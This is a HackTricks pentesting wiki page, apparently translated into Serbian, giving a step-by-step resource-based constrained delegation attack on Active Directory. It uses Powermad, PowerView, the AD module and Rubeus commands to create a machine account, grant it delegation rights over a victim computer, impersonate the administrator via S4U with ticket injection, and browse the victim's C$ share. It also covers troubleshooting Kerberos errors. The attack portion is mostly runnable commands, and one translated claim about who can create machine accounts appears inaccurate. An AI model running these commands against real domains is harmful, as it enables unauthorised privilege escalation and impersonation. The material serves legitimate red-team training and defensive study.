# Resource-based Constrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnovi Resource-based Constrained Delegation

Ovo je slično osnovnoj [Constrained Delegation](constrained-delegation.md) ali **umesto** davanja dozvola **objektu** da **imituje bilo kog korisnika prema servisu**. Resource-based Constrained Delegation **postavlja** u **objektu ko može da imituje bilo kog korisnika prema njemu**.

U ovom slučaju, ograničeni objekat će imati atribut pod nazivom _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da imituje bilo kog drugog korisnika prema njemu.

Još jedna važna razlika između ovog Constrained Delegation i drugih delegacija je da bilo koji korisnik sa **dozvolama za pisanje nad računom mašine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) može postaviti _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (U drugim oblicima Delegacije potrebne su privilegije domen administratora).

### Novi koncepti

U Constrained Delegation je rečeno da je **`TrustedToAuthForDelegation`** oznaka unutar _userAccountControl_ vrednosti korisnika potrebna za izvođenje **S4U2Self.** Ali to nije potpuno tačno.\
Stvarnost je da čak i bez te vrednosti, možete izvesti **S4U2Self** protiv bilo kog korisnika ako ste **servis** (imate SPN) ali, ako imate **`TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable** i ako **nemate** tu oznaku vraćeni TGS **neće** biti **Forwardable**.

Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NISU Forwardable** pokušaj zloupotrebe **osnovne Constrain Delegation** neće **uspeti**. Ali ako pokušavate da iskoristite **Resource-Based constrain delegation, to će uspeti** (ovo nije ranjivost, to je funkcija, očigledno).

### Struktura napada

> Ako imate **dozvole za pisanje ekvivalentne privilegijama** nad **računom računara** možete dobiti **privilegovan pristup** na toj mašini.

Pretpostavimo da je napadač već **dobio dozvole za pisanje ekvivalentne privilegijama nad računarom žrtve**.

1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** (“Servis A”). Imajte na umu da **bilo koji** _Admin User_ bez bilo kojih drugih posebnih privilegija može **kreirati** do 10 **računarskih objekata (**_**MachineAccountQuota**_**)** i postaviti im **SPN**. Tako da napadač može jednostavno kreirati računar i postaviti SPN.
2. Napadač **zloupotrebljava svoje DOZVOLE ZA PISANJE** nad računarom žrtve (ServisB) da konfiguriše **resource-based constrained delegation da omogući Servisu A da imituje bilo kog korisnika** prema tom računaru žrtve (ServisB).
3. Napadač koristi Rubeus da izvede **potpun S4U napad** (S4U2Self i S4U2Proxy) od Servisa A do Servisa B za korisnika **sa privilegovanim pristupom Servisu B**.
1. S4U2Self (iz SPN kompromitovanog/kreativnog naloga): Zatraži **TGS od Administratora za mene** (Nije Forwardable).
2. S4U2Proxy: Koristi **ne Forwardable TGS** iz prethodnog koraka da zatraži **TGS** od **Administratora** za **računar žrtve**.
3. Čak i ako koristite ne Forwardable TGS, pošto zloupotrebljavate Resource-based constrained delegation, to će uspeti.
4. Napadač može **proći kroz tiket** i **imitirati** korisnika da dobije **pristup žrtvi Servisu B**.

Da biste proverili _**MachineAccountQuota**_ domena možete koristiti:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena koristeći [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje R**esource-based Constrained Delegation**

**Korišćenje activedirectory PowerShell modula**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Извођење потпуног S4U напада

Прво, креирали смо нови објекат Рачунар са лозинком `123456`, тако да нам је потребан хеш те лозинке:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će odštampati RC4 i AES heš vrednosti za taj nalog.\
Sada se napad može izvršiti:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više karata jednostavno tražeći jednom koristeći `/altservice` parametar Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Napomena da korisnici imaju atribut pod nazivom "**Ne može biti delegiran**". Ako korisnik ima ovaj atribut postavljen na True, nećete moći da se pretvarate da je on. Ova svojstvo se može videti unutar bloodhound.
{% endhint %}

### Pristupanje

Poslednja komanda će izvršiti **potpun S4U napad i injektovaće TGS** od Administratora na žrtvovanu mašinu u **memoriji**.\
U ovom primeru je zatražen TGS za **CIFS** servis od Administratora, tako da ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih servisnih karata

Saznajte više o [**dostupnim servisnim kartama ovde**](silver-ticket.md#available-services).

## Kerberos greške

* **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je kerberos konfigurisan da ne koristi DES ili RC4 i da pružate samo RC4 hash. Pružite Rubeusu barem AES256 hash (ili jednostavno pružite rc4, aes128 i aes256 hash). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Ovo znači da je vreme trenutnog računara različito od vremena DC-a i kerberos ne funkcioniše ispravno.
* **`preauth_failed`**: Ovo znači da dati korisničko ime + hash ne funkcionišu za prijavu. Možda ste zaboravili da stavite "$" unutar korisničkog imena prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Ovo može značiti:
* Korisnik kojeg pokušavate da imitira ne može da pristupi željenoj usluzi (jer ne možete da ga imitira ili zato što nema dovoljno privilegija)
* Tražena usluga ne postoji (ako tražite kartu za winrm, ali winrm ne radi)
* Lažni računar koji je kreiran je izgubio svoje privilegije nad ranjivim serverom i morate ih ponovo dodeliti.

## Reference

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Saznajte i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Saznajte i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
